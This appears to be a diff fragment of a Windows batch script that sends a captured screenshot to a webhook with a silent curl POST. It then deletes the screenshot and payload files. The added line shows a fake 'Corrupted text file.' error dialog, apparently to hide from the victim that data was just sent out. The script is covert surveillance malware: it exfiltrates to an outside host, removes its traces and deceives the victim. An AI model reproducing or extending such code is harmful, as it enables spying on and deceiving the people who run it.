@@ -34,3 +34,5 @@ echo }
 curl -X POST -H "Content-Type: application/json" --data "@%temp_dir%\payload.json" %webhook% >nul 2>&1
 
 del %temp_dir%\screenshot.png %temp_dir%\payload.json %temp_dir%\response.json 2>nul
+
+powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Corrupted text file.', 'Windows', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
